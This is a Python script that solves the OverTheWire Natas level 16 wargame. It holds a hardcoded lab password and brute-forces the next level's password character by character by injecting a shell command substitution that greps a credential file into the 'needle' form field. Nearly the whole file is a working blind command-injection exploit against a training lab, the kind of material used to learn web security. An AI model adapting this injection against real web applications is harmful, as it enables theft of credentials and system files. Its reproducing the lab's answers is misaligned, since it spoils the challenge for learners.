import re
import requests

username  = "natas16"
character = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
url = "http://%s.natas.labs.overthewire.org/index.php" %username

password = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"

session = requests.Session()

seen_passwd = []
while(len(seen_passwd)<32):
    for ch in character:
        response = session.post(url,data={"needle":"anythings$(grep ^"+"".join(seen_passwd) + ch+" /etc/natas_webpass/natas17)"},auth=(username,password))
        content = response.text
        
        returned = (re.findall('<pre>\n(.*)\n</pre>',content))

        if (not returned):
            seen_passwd.append(ch)
            print("".join(seen_passwd))
            break
